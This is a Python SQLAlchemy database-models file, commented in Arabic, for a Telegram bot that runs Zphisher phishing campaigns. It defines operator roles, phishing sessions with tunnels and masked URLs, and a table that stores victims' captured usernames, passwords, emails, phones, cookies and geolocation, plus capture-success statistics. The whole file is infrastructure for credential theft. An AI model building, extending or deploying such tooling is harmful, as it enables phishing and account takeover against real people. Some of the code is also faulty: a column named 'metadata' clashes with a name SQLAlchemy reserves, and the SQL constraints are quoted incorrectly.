"""
📊 نماذج قاعدة البيانات المتقدمة لبوت Zphisher Telegram
تدعم التشفير، الفهرسة المحسنة، والعلاقات المعقدة
"""

import json
import uuid
from datetime import datetime
from typing import Optional, Dict, Any, List
from sqlalchemy import (
    Column, Integer, BigInteger, String, Text, Boolean, DateTime, 
    ForeignKey, Index, UniqueConstraint, CheckConstraint, JSON
)
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import relationship, validates
from sqlalchemy.sql import func
from sqlalchemy.dialects.postgresql import UUID
from sqlalchemy.types import TypeDecorator, VARCHAR

from ..config import settings, security_manager

Base = declarative_base()

class EncryptedType(TypeDecorator):
    """نوع بيانات مخصص للتشفير التلقائي"""
    impl = VARCHAR
    cache_ok = True

    def process_bind_param(self, value, dialect):
        """تشفير البيانات عند الحفظ"""
        if value is not None:
            return security_manager.encrypt_data(str(value))
        return value

    def process_result_value(self, value, dialect):
        """فك تشفير البيانات عند الاستعلام"""
        if value is not None:
            try:
                return security_manager.decrypt_data(value)
            except Exception:
                # في حالة فشل فك التشفير، إرجاع القيمة كما هي
                return value
        return value

class BaseModel:
    """نموذج أساسي يحتوي على الحقول المشتركة"""
    
    id = Column(Integer, primary_key=True, index=True)
    created_at = Column(DateTime(timezone=True), server_default=func.now(), nullable=False)
    updated_at = Column(DateTime(timezone=True), server_default=func.now(), onupdate=func.now(), nullable=False)
    
    def to_dict(self) -> Dict[str, Any]:
        """تحويل النموذج إلى قاموس"""
        result = {}
        for column in self.__table__.columns:
            value = getattr(self, column.name)
            if isinstance(value, datetime):
                value = value.isoformat()
            result[column.name] = value
        return result
    
    def update_from_dict(self, data: Dict[str, Any]):
        """تحديث النموذج من قاموس"""
        for key, value in data.items():
            if hasattr(self, key):
                setattr(self, key, value)

class User(Base, BaseModel):
    """نموذج المستخدمين مع إدارة الأذونات المتقدمة"""
    
    __tablename__ = "users"
    
    # المعلومات الأساسية
    user_id = Column(BigInteger, unique=True, nullable=False, index=True)
    username = Column(String(100), nullable=True, index=True)
    first_name = Column(String(100), nullable=True)
    last_name = Column(String(100), nullable=True)
    language_code = Column(String(10), default="en", nullable=False)
    
    # الأذونات والحالة
    role = Column(String(20), default="viewer", nullable=False, index=True)
    is_active = Column(Boolean, default=True, nullable=False, index=True)
    is_banned = Column(Boolean, default=False, nullable=False, index=True)
    ban_reason = Column(Text, nullable=True)
    
    # معلومات إضافية
    last_seen = Column(DateTime(timezone=True), server_default=func.now())
    join_date = Column(DateTime(timezone=True), server_default=func.now())
    total_sessions = Column(Integer, default=0, nullable=False)
    
    # العلاقات
    sessions = relationship("Session", back_populates="user", cascade="all, delete-orphan")
    permissions = relationship("UserPermission", back_populates="user", cascade="all, delete-orphan")
    logs = relationship("SystemLog", back_populates="user", cascade="all, delete-orphan")
    
    # القيود والفهارس
    __table_args__ = (
        Index('idx_user_role_active', 'role', 'is_active'),
        Index('idx_user_last_seen', 'last_seen'),
        CheckConstraint('role IN ("super_admin", "admin", "operator", "viewer", "banned")', name='check_valid_role'),
    )
    
    @validates('role')
    def validate_role(self, key, role):
        """التحقق من صحة الدور"""
        valid_roles = ["super_admin", "admin", "operator", "viewer", "banned"]
        if role not in valid_roles:
            raise ValueError(f"دور غير صحيح: {role}. الأدوار المسموحة: {valid_roles}")
        return role
    
    def is_admin(self) -> bool:
        """التحقق من كون المستخدم مسؤول"""
        return self.role in ["super_admin", "admin"]
    
    def can_create_sessions(self) -> bool:
        """التحقق من إمكانية إنشاء جلسات"""
        return self.role in ["super_admin", "admin", "operator"] and self.is_active and not self.is_banned
    
    def can_view_data(self) -> bool:
        """التحقق من إمكانية مشاهدة البيانات"""
        return self.is_active and not self.is_banned

class Session(Base, BaseModel):
    """نموذج جلسات التصيد مع تتبع شامل"""
    
    __tablename__ = "sessions"
    
    # معرف الجلسة الفريد
    session_id = Column(String(50), unique=True, nullable=False, index=True, default=lambda: str(uuid.uuid4()))
    
    # معلومات المستخدم
    user_id = Column(BigInteger, ForeignKey("users.user_id"), nullable=False, index=True)
    
    # إعدادات الجلسة
    site_type = Column(String(50), nullable=False, index=True)
    site_variant = Column(String(50), nullable=True)  # للمواقع التي لها أشكال متعددة
    tunnel_type = Column(String(20), nullable=False, index=True)
    custom_port = Column(Integer, nullable=True)
    
    # الروابط والمسارات
    local_url = Column(String(255), nullable=True)
    public_url = Column(String(255), nullable=True)
    short_url = Column(String(255), nullable=True)
    masked_url = Column(String(255), nullable=True)
    
    # إعدادات متقدمة
    custom_mask = Column(String(255), nullable=True)
    enable_notifications = Column(Boolean, default=True, nullable=False)
    auto_stop_after = Column(Integer, nullable=True)  # إيقاف تلقائي بعد X دقيقة
    
    # حالة الجلسة
    status = Column(String(20), default="preparing", nullable=False, index=True)
    started_at = Column(DateTime(timezone=True), nullable=True)
    stopped_at = Column(DateTime(timezone=True), nullable=True)
    
    # إحصائيات
    total_visitors = Column(Integer, default=0, nullable=False)
    total_credentials = Column(Integer, default=0, nullable=False)
    success_rate = Column(String(10), default="0%", nullable=False)
    
    # معلومات النظام
    server_process_id = Column(Integer, nullable=True)
    tunnel_process_id = Column(Integer, nullable=True)
    server_log_path = Column(String(255), nullable=True)
    
    # العلاقات
    user = relationship("User", back_populates="sessions")
    captured_data = relationship("CapturedData", back_populates="session", cascade="all, delete-orphan")
    
    # القيود والفهارس
    __table_args__ = (
        Index('idx_session_status_created', 'status', 'created_at'),
        Index('idx_session_user_status', 'user_id', 'status'),
        Index('idx_session_site_type', 'site_type'),
        CheckConstraint('status IN ("preparing", "starting", "active", "stopping", "stopped", "error")', name='check_valid_status'),
        CheckConstraint('tunnel_type IN ("localhost", "cloudflared", "localxpose")', name='check_valid_tunnel'),
    )
    
    @validates('status')
    def validate_status(self, key, status):
        """التحقق من صحة حالة الجلسة"""
        valid_statuses = ["preparing", "starting", "active", "stopping", "stopped", "error"]
        if status not in valid_statuses:
            raise ValueError(f"حالة غير صحيحة: {status}")
        return status
    
    def is_active(self) -> bool:
        """التحقق من كون الجلسة نشطة"""
        return self.status == "active"
    
    def can_be_stopped(self) -> bool:
        """التحقق من إمكانية إيقاف الجلسة"""
        return self.status in ["starting", "active"]
    
    def get_duration(self) -> Optional[int]:
        """الحصول على مدة الجلسة بالثواني"""
        if self.started_at:
            end_time = self.stopped_at or datetime.utcnow()
            return int((end_time - self.started_at).total_seconds())
        return None

class CapturedData(Base, BaseModel):
    """نموذج البيانات المُلتقطة مع التشفير المتقدم"""
    
    __tablename__ = "captured_data"
    
    # ربط بالجلسة
    session_id = Column(String(50), ForeignKey("sessions.session_id"), nullable=False, index=True)
    
    # معلومات الشبكة
    ip_address = Column(String(45), nullable=False, index=True)
    user_agent = Column(Text, nullable=True)
    referer = Column(String(255), nullable=True)
    
    # البيانات المُلتقطة (مشفرة)
    username = Column(EncryptedType(255), nullable=True)
    password = Column(EncryptedType(255), nullable=True)
    email = Column(EncryptedType(255), nullable=True)
    phone = Column(EncryptedType(50), nullable=True)
    
    # معلومات إضافية
    form_data = Column(JSON, nullable=True)  # بيانات النماذج الأخرى
    cookies = Column(JSON, nullable=True)    # ملفات تعريف الارتباط
    headers = Column(JSON, nullable=True)    # رؤوس HTTP
    
    # تحليل جغرافي
    country = Column(String(100), nullable=True, index=True)
    city = Column(String(100), nullable=True, index=True)
    isp = Column(String(255), nullable=True)
    
    # تحليل الجهاز
    device_type = Column(String(50), nullable=True, index=True)
    browser = Column(String(100), nullable=True, index=True)
    os = Column(String(100), nullable=True, index=True)
    
    # معلومات الالتقاط
    capture_method = Column(String(50), default="form", nullable=False)
    is_verified = Column(Boolean, default=False, nullable=False)
    confidence_score = Column(String(10), default="unknown", nullable=False)
    
    # العلاقات
    session = relationship("Session", back_populates="captured_data")
    
    # القيود والفهارس
    __table_args__ = (
        Index('idx_captured_ip_time', 'ip_address', 'created_at'),
        Index('idx_captured_session_time', 'session_id', 'created_at'),
        Index('idx_captured_country_city', 'country', 'city'),
        Index('idx_captured_device_browser', 'device_type', 'browser'),
    )
    
    def get_credentials_dict(self) -> Dict[str, Any]:
        """الحصول على البيانات المُلتقطة كقاموس"""
        return {
            'username': self.username,
            'password': self.password,
            'email': self.email,
            'phone': self.phone,
            'form_data': self.form_data or {}
        }
    
    def is_complete(self) -> bool:
        """التحقق من اكتمال البيانات المُلتقطة"""
        return bool(self.username and self.password)

class SystemLog(Base, BaseModel):
    """نموذج سجلات النظام المتقدم"""
    
    __tablename__ = "system_logs"
    
    # معلومات المستخدم
    user_id = Column(BigInteger, ForeignKey("users.user_id"), nullable=True, index=True)
    
    # معلومات الحدث
    event_type = Column(String(50), nullable=False, index=True)
    event_action = Column(String(100), nullable=False, index=True)
    event_description = Column(Text, nullable=True)
    
    # السياق
    session_id = Column(String(50), nullable=True, index=True)
    ip_address = Column(String(45), nullable=True, index=True)
    user_agent = Column(Text, nullable=True)
    
    # البيانات الإضافية
    metadata = Column(JSON, nullable=True)
    
    # مستوى الخطورة
    severity = Column(String(20), default="info", nullable=False, index=True)
    
    # العلاقات
    user = relationship("User", back_populates="logs")
    
    # القيود والفهارس
    __table_args__ = (
        Index('idx_log_type_action', 'event_type', 'event_action'),
        Index('idx_log_severity_time', 'severity', 'created_at'),
        Index('idx_log_user_time', 'user_id', 'created_at'),
        CheckConstraint('severity IN ("debug", "info", "warning", "error", "critical")', name='check_valid_severity'),
    )

class UserPermission(Base, BaseModel):
    """نموذج أذونات المستخدمين المتقدمة"""
    
    __tablename__ = "user_permissions"
    
    # ربط بالمستخدم
    user_id = Column(BigInteger, ForeignKey("users.user_id"), nullable=False, index=True)
    
    # الإذن
    permission = Column(String(100), nullable=False, index=True)
    resource = Column(String(100), nullable=True, index=True)  # المورد المحدد
    
    # القيم
    granted = Column(Boolean, default=True, nullable=False)
    granted_by = Column(BigInteger, nullable=True)  # من منح الإذن
    granted_at = Column(DateTime(timezone=True), server_default=func.now())
    expires_at = Column(DateTime(timezone=True), nullable=True)  # انتهاء الصلاحية
    
    # العلاقات
    user = relationship("User", back_populates="permissions")
    
    # القيود والفهارس
    __table_args__ = (
        UniqueConstraint('user_id', 'permission', 'resource', name='uix_user_permission_resource'),
        Index('idx_permission_granted', 'permission', 'granted'),
        Index('idx_permission_expires', 'expires_at'),
    )
    
    def is_valid(self) -> bool:
        """التحقق من صحة الإذن"""
        if not self.granted:
            return False
        if self.expires_at and self.expires_at < datetime.utcnow():
            return False
        return True

class SessionStats(Base, BaseModel):
    """نموذج إحصائيات الجلسات المفصلة"""
    
    __tablename__ = "session_stats"
    
    # ربط بالجلسة
    session_id = Column(String(50), ForeignKey("sessions.session_id"), nullable=False, index=True)
    
    # الإحصائيات الزمنية
    stats_date = Column(DateTime(timezone=True), nullable=False, index=True)
    hour = Column(Integer, nullable=False, index=True)
    
    # أرقام الزوار
    unique_visitors = Column(Integer, default=0, nullable=False)
    total_visits = Column(Integer, default=0, nullable=False)
    successful_captures = Column(Integer, default=0, nullable=False)
    
    # التوزيع الجغرافي
    top_countries = Column(JSON, nullable=True)
    top_cities = Column(JSON, nullable=True)
    
    # معلومات الأجهزة
    device_breakdown = Column(JSON, nullable=True)
    browser_breakdown = Column(JSON, nullable=True)
    os_breakdown = Column(JSON, nullable=True)
    
    # القيود والفهارس
    __table_args__ = (
        UniqueConstraint('session_id', 'stats_date', 'hour', name='uix_session_stats_time'),
        Index('idx_stats_date_hour', 'stats_date', 'hour'),
    )

# إنشاء الجداول
async def create_tables():
    """إنشاء جميع الجداول في قاعدة البيانات"""
    from .connection import get_database_engine
    
    try:
        engine = await get_database_engine()
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        print("✅ تم إنشاء جداول قاعدة البيانات بنجاح")
    except Exception as e:
        print(f"❌ خطأ في إنشاء جداول قاعدة البيانات: {e}")
        raise

async def drop_tables():
    """حذف جميع الجداول (للاختبار فقط)"""
    from .connection import get_database_engine
    
    try:
        engine = await get_database_engine()
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.drop_all)
        print("🗑️ تم حذف جداول قاعدة البيانات")
    except Exception as e:
        print(f"❌ خطأ في حذف جداول قاعدة البيانات: {e}")
        raise